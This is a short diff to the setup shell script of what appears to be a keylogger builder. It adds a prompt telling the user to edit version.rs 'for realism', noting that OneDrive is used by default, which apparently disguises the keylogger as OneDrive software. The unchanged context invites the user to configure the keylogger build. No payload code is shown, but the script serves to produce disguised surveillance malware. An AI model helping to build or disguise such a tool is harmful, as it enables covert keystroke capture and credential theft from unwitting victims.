@@ -77,6 +77,8 @@ logo
 
 spacer
 
+echo -e "${green}For realism, edit version.rs the file. OneDrive is used by default.${reset}"
+
 echo -e "${cyan}Let's configure your keylogger build! Please enter the required information.${reset}"
 
 while true; do
